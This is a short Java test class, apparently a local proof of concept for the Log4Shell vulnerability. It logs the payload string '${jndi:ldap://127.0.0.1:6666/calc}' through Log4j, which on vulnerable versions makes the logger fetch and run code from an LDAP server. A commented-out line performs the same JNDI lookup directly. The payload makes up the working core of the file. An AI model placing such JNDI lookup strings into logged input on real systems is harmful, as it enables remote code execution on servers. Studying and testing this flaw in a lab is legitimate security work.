package com.qxx.common.service;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.NamingException;

public class Log4jTest {

    private static final Logger logger = LogManager.getLogger(Log4jTest.class);
    public static void main(String[] args) throws NamingException {
        // Object object=new InitialContext().lookup("ldap://127.0.0.1:6666/calc");
        logger.error("${jndi:ldap://127.0.0.1:6666/calc}");
    }
}
